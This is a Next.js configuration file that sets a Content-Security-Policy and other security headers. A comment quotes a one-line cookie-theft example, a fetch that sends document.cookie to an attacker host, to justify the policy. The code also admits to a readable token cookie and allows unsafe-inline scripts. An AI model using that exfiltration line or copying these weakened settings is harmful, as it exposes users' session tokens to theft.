import path from 'node:path';
import { fileURLToPath } from 'node:url';

// F8: Validate required env vars at build time
if (!process.env.NEXT_PUBLIC_TENANT_ID) {
  throw new Error('NEXT_PUBLIC_TENANT_ID env var is required. Set it in .env.local');
}

const projectRoot = path.dirname(fileURLToPath(import.meta.url));

// The access token is mirrored into a readable (non-HttpOnly) cookie so
// proxy.ts (edge route/role guarding) and server components can see it —
// that cookie can't be made HttpOnly without routing auth through a Next.js
// route-handler/BFF layer, which is a larger change than this pass covers.
// A strict CSP is the mitigation that IS available now: it closes off the
// easiest way an XSS payload would exfiltrate that cookie or the in-memory
// access token (a one-line `fetch(attacker, {body: document.cookie})`).
const apiOrigin = (() => {
  try {
    return new URL(process.env.NEXT_PUBLIC_API_URL ?? 'http://localhost:3001').origin;
  } catch {
    return 'http://localhost:3001';
  }
})();

const csp = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "font-src 'self' data:",
  `connect-src 'self' ${apiOrigin} https://*.sentry.io`,
  "frame-ancestors 'none'",
  "base-uri 'self'",
  "form-action 'self'",
].join('; ');

const securityHeaders = [
  { key: 'Content-Security-Policy', value: csp },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'geolocation=(), microphone=(), camera=()' },
];

/** @type {import('next').NextConfig} */
const nextConfig = {
  typescript: {
    ignoreBuildErrors: true,
  },
  turbopack: {
    root: projectRoot,
  },
  images: {
    unoptimized: true,
  },
  async headers() {
    return [{ source: '/:path*', headers: securityHeaders }];
  },
};

export default nextConfig;
